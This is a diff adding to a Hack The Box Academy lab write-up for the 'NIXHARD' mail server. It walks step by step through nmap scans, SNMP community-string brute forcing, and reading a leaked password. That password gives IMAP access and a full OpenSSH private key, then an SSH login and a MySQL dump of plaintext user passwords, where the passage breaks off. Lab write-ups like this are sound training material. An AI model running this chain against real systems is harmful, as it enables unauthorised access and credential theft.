@@ -4139,12 +4139,12 @@ The flag is `lnch7ehrdn43i7AoqVPK4zWR`.
 
 ## Nmap Scan
 ```bash
-┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-gk7zh21yzw]─[~]
-└──╼ [★]$ nmap -sV 10.129.167.149
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-01 03:57 EDT
-Nmap scan report for 10.129.167.149
+┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
+└──╼ [★]$ sudo nmap -sV 10.129.174.189
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-01 04:41 EDT
+Nmap scan report for 10.129.174.189
 Host is up (0.17s latency).
-Not shown: 995 closed tcp ports (conn-refused)
+Not shown: 995 closed tcp ports (reset)
 PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 110/tcp open  pop3     Dovecot pop3d
@@ -4154,7 +4154,665 @@ PORT    STATE SERVICE  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 29.63 seconds
+Nmap done: 1 IP address (1 host up) scanned in 122.62 seconds
 ```
 
-This is a machine running a mail server.
+This is a machine running a mail server. Let's do more detailed scan on the ports related to IMAP and POP3.
+
+```bash
+┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
+└──╼ [★]$ sudo nmap -sV 10.129.174.189 -p110,143,993,995 -sC
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-01 04:44 EDT
+Nmap scan report for 10.129.174.189
+Host is up (0.24s latency).
+
+PORT    STATE SERVICE  VERSION
+110/tcp open  pop3     Dovecot pop3d
+| ssl-cert: Subject: commonName=NIXHARD
+| Subject Alternative Name: DNS:NIXHARD
+| Not valid before: 2021-11-10T01:30:25
+|_Not valid after:  2031-11-08T01:30:25
+|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE CAPA PIPELINING TOP USER STLS UIDL SASL(PLAIN)
+|_ssl-date: TLS randomness does not represent time
+143/tcp open  imap     Dovecot imapd (Ubuntu)
+|_imap-capabilities: AUTH=PLAINA0001 more ENABLE STARTTLS have LOGIN-REFERRALS capabilities listed Pre-login SASL-IR ID OK LITERAL+ IMAP4rev1 post-login IDLE
+| ssl-cert: Subject: commonName=NIXHARD
+| Subject Alternative Name: DNS:NIXHARD
+| Not valid before: 2021-11-10T01:30:25
+|_Not valid after:  2031-11-08T01:30:25
+|_ssl-date: TLS randomness does not represent time
+993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=NIXHARD
+| Subject Alternative Name: DNS:NIXHARD
+| Not valid before: 2021-11-10T01:30:25
+|_Not valid after:  2031-11-08T01:30:25
+|_imap-capabilities: more ENABLE AUTH=PLAINA0001 have LOGIN-REFERRALS capabilities Pre-login listed SASL-IR ID OK LITERAL+ IMAP4rev1 post-login IDLE
+995/tcp open  ssl/pop3 Dovecot pop3d
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=NIXHARD
+| Subject Alternative Name: DNS:NIXHARD
+| Not valid before: 2021-11-10T01:30:25
+|_Not valid after:  2031-11-08T01:30:25
+|_pop3-capabilities: TOP RESP-CODES SASL(PLAIN) USER AUTH-RESP-CODE UIDL CAPA PIPELINING
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.81 seconds
+```
+
+SSL certificate reveals the hostname `NIXHARD`.
+
+Let's do a UDP scan too.
+
+```bash
+┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
+└──╼ [★]$ sudo nmap -sU --top-ports 100 10.129.174.189
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-01 04:59 EDT
+Nmap scan report for 10.129.174.189
+Host is up (0.17s latency).
+Not shown: 98 closed udp ports (port-unreach)
+PORT    STATE         SERVICE
+68/udp  open|filtered dhcpc
+161/udp open          snmp
+
+Nmap done: 1 IP address (1 host up) scanned in 103.15 seconds
+```
+ 
+There is a `snmp` service running.
+
+## Exploring SNMP
+A more detailed version scan through Nmap reveals that the `snmp` version is `v3`.
+```bash
+┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
+└──╼ [★]$ sudo nmap -sU -sV -p 161 10.129.174.189
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-01 05:03 EDT
+Nmap scan report for 10.129.174.189
+Host is up (0.17s latency).
+
+PORT    STATE SERVICE VERSION
+161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.07 seconds
+
+```
+
+Let's bruteforce the community strings:
+```bash
+┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
+└──╼ [★]$ sudo apt install onesixtyone
+onesixtyone is already the newest version (0.3.4-1).
+onesixtyone set to manually installed.
+The following package was automatically installed and is no longer required:
+  linux-image-6.12.73+deb13-amd64
+Use 'sudo apt autoremove' to remove it.
+
+Summary:
+  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 533
+┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
+└──╼ [★]$ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.174.189
+Scanning 1 hosts, 3219 communities
+10.129.174.189 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
+```
+
+We found a string called `backup`. Let's explore it
+```bash
+┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
+└──╼ [★]$ snmpwalk -c backup -v1 10.129.174.189 .
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (167009) 0:27:50.09
+iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
+iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
+iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
+iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+iso.3.6.1.2.1.1.8.0 = Timeticks: (15) 0:00:00.15
+iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
+iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
+iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
+iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
+iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
+iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
+iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
+iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
+iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
+iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
+iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
+iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
+iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
+iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
+iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
+iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
+iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
+iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
+iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
+iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
+iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (15) 0:00:00.15
+iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (15) 0:00:00.15
+iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (15) 0:00:00.15
+iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (15) 0:00:00.15
+iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (15) 0:00:00.15
+iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (15) 0:00:00.15
+iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (15) 0:00:00.15
+iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (15) 0:00:00.15
+iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (15) 0:00:00.15
+iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (15) 0:00:00.15
+iso.3.6.1.2.1.25.1.1.0 = Timeticks: (168458) 0:28:04.58
+iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 EA 09 01 09 08 0B 00 2B 00 00 
+iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
+iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity
+"
+iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
+iso.3.6.1.2.1.25.1.6.0 = Gauge32: 162
+iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
+iso.3.6.1.2.1.25.1.7.1.1.0 = INTEGER: 1
+iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
+iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
+iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
+iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
+iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
+iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
+iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
+iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
+iso.3.6.1.2.1.25.1.7.1.3.1.1.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
+iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:
+Authentication token manipulation error
+chpasswd: (line 1, user tom) password not changed
+Changing password for tom."
+iso.3.6.1.2.1.25.1.7.1.3.1.3.6.66.65.67.75.85.80 = INTEGER: 4
+iso.3.6.1.2.1.25.1.7.1.3.1.4.6.66.65.67.75.85.80 = INTEGER: 1
+iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.1 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
+iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.2 = STRING: "Authentication token manipulation error"
+iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.3 = STRING: "chpasswd: (line 1, user tom) password not changed"
+iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = STRING: "Changing password for tom."
+End of MIB
+
+```
+
+It seems that we have managed to find some sort of credential: `tom NMds732Js2761`.
+
+## Exploring IMAP/POP3
+With the credentials on hand, let's enumerate IMAP/POP3.
+
+```bash
+┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
+└──╼ [★]$ curl -k 'imaps://10.129.174.189' --user tom:NMds732Js2761 -v
+*   Trying 10.129.174.189:993...
+* TLSv1.3 (OUT), TLS handshake, Client hello (1):
+* TLSv1.3 (IN), TLS handshake, Server hello (2):
+* TLSv1.3 (IN), TLS change cipher, Change cipher spec (1):
+* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
+* TLSv1.3 (IN), TLS handshake, Certificate (11):
+* TLSv1.3 (IN), TLS handshake, CERT verify (15):
+* TLSv1.3 (IN), TLS handshake, Finished (20):
+* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
+* TLSv1.3 (OUT), TLS handshake, Finished (20):
+* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS
+* Server certificate:
+*  subject: CN=NIXHARD
+*  start date: Nov 10 01:30:25 2021 GMT
+*  expire date: Nov  8 01:30:25 2031 GMT
+*  issuer: CN=NIXHARD
+*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
+*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
+* Connected to 10.129.174.189 (10.129.174.189) port 993
+* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
+* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
+< * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
+> A001 CAPABILITY
+< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
+< A001 OK Pre-login capabilities listed, post-login capabilities have more.
+> A002 AUTHENTICATE PLAIN AHRvbQBOTWRzNzMySnMyNzYx
+< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE
+< A002 OK Logged in
+> A003 LIST "" *
+< * LIST (\HasNoChildren) "." Notes
+* LIST (\HasNoChildren) "." Notes
+< * LIST (\HasNoChildren) "." Meetings
+* LIST (\HasNoChildren) "." Meetings
+< * LIST (\HasNoChildren \UnMarked) "." Important
+* LIST (\HasNoChildren \UnMarked) "." Important
+< * LIST (\HasNoChildren) "." INBOX
+* LIST (\HasNoChildren) "." INBOX
+< A003 OK List completed (0.005 + 0.000 + 0.004 secs).
+* Connection #0 to host 10.129.174.189 left intact
+
+```
+
+Let's connect to the mail server.
+```bash
+┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
+└──╼ [★]$ openssl s_client -connect 10.129.174.189:993 -quiet -crlf
+Connecting to 10.129.174.189
+Can't use SSL_get_servername
+depth=0 CN=NIXHARD
+verify error:num=18:self-signed certificate
+verify return:1
+depth=0 CN=NIXHARD
+verify return:1
+* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
+a001 LOGIN tom NMds732Js2761
+a001 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
+a002 SELECT Notes
+* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
+* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
+* 0 EXISTS
+* 0 RECENT
+* OK [UIDVALIDITY 1636509065] UIDs valid
+* OK [UIDNEXT 1] Predicted next UID
+a002 OK [READ-WRITE] Select completed (0.015 + 0.000 + 0.014 secs).
+a003 FETCH 1:* BODY[]
+a003 BAD Error in IMAP command FETCH: Invalid messageset (0.001 + 0.000 secs).
+a004 SELECT INBOX
+* OK [CLOSED] Previous mailbox closed.
+* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
+* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
+* 1 EXISTS
+* 0 RECENT
+* OK [UIDVALIDITY 1636509064] UIDs valid
+* OK [UIDNEXT 2] Predicted next UID
+a004 OK [READ-WRITE] Select completed (0.006 + 0.000 + 0.005 secs).
+a005 FETCH 1:* BODY[]^[[C
+a005 BAD Error in IMAP command FETCH: Invalid characters in atom (0.001 + 0.000 secs).
+a006 FETCH 1:* BODY[]
+* 1 FETCH (BODY[] {3661}
+HELO dev.inlanefreight.htb
+MAIL FROM:<tech@dev.inlanefreight.htb>
+RCPT TO:<bob@inlanefreight.htb>
+DATA
+From: [Admin] <tech@inlanefreight.htb>
+To: <tom@inlanefreight.htb>
+Date: Wed, 10 Nov 2010 14:21:26 +0200
+Subject: KEY
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+)
+a006 OK Fetch completed (0.005 + 0.000 + 0.004 secs).
+```
+
+We found a private key, which we can potentially use to SSH into the machine.
+
+## Exploring SSH
+We copy the discovered private key into a `id_rsa` file and then we attempt to SSH into the machine as user `tom`.
+
+```bash
+┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
+└──╼ [★]$ vim id_rsa
+┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
+└──╼ [★]$ chmod 600 id_rsa 
+┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
+└──╼ [★]$ ssh -i id_rsa tom@10.129.174.189
+The authenticity of host '10.129.174.189 (10.129.174.189)' can't be established.
+ED25519 key fingerprint is SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.174.189' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue 01 Sep 2026 09:22:56 AM UTC
+
+  System load:  0.03              Processes:               185
+  Usage of /:   66.4% of 5.70GB   Users logged in:         0
+  Memory usage: 32%               IPv4 address for ens192: 10.129.174.189
+  Swap usage:   0%
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+Last login: Wed Nov 10 02:51:52 2021 from 10.10.14.20
+tom@NIXHARD:~$
+```
+
+We managed to SSH into the machine. Let's explore the directory.
+```bash
+tom@NIXHARD:~$ ls -al
+total 48
+drwxr-xr-x 6 tom  tom  4096 Nov 10  2021 .
+drwxr-xr-x 5 root root 4096 Nov 10  2021 ..
+-rw------- 1 tom  tom   532 Nov 10  2021 .bash_history
+-rw-r--r-- 1 tom  tom   220 Nov 10  2021 .bash_logout
+-rw-r--r-- 1 tom  tom  3771 Nov 10  2021 .bashrc
+drwx------ 2 tom  tom  4096 Nov 10  2021 .cache
+drwx------ 3 tom  tom  4096 Nov 10  2021 mail
+drwx------ 8 tom  tom  4096 Sep  1 09:18 Maildir
+-rw------- 1 tom  tom   169 Nov 10  2021 .mysql_history
+-rw-r--r-- 1 tom  tom   807 Nov 10  2021 .profile
+drwx------ 2 tom  tom  4096 Nov 10  2021 .ssh
+-rw------- 1 tom  tom  2018 Nov 10  2021 .viminfo
+
+```
+
+There seems to be a MySQL server running in the system.
+
+## Exploring MySQL
+```bash
+tom@NIXHARD:~$ cat .mysql_history
+_HiStOrY_V2_
+show\040databases;
+select\040*\040from\040users;
+use\040users;
+select\040*\040from\040users;
+show\040databases;
+use\040users;
+select\040*\040from\040users;
+```
+From the `mysql` history file, there seems to be a database called `users`. Let's try to connect to `mysql` in the system:
+
+```bash
+tom@NIXHARD:~$ mysql -u tom -pNMds732Js2761
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 9
+Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2021, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql>
+```
+
+We could access the `mysql` interface. Let's enumerate the databases and see what information we can access.
+```bash
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| users              |
++--------------------+
+5 rows in set (0.03 sec)
+
+mysql> use users;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++-----------------+
+| Tables_in_users |
++-----------------+
+| users           |
++-----------------+
+1 row in set (0.00 sec)
+
+mysql> select * from users;
++------+-------------------+------------------------------+
+| id   | username          | password                     |
++------+-------------------+------------------------------+
+|    1 | ppavlata0         | 6znAfvTbB2                   |
+|    2 | ktofanini1        | TP2NxFD62e                   |
+|    3 | rallwell2         | t1t7WaqvEfv                  |
+|    4 | efernier3         | ZRYOBO9PI                    |
+|    5 | fpoon4            | 5Spyx2Jb                     |
+|    6 | jgurnell5         | LMCnWKD                      |
+|    7 | aminter6          | ngCyGg3                      |
+|    8 | dwattinham7       | H2bpGC5                      |
+|    9 | ddumphreys8       | eGek5Q8                      |
+|   10 | etookey9          | kXBd88ZX                     |
+|   11 | mlindbacka        | H9uTnIvli92                  |
+|   12 | awebbeb           | RALeM2IfuwA                  |
+|   13 | tswannellc        | oHdZWwO9                     |
+|   14 | slydiattd         | r3wRgn                       |
+|   15 | cparslowe         | nVdJAHr                      |
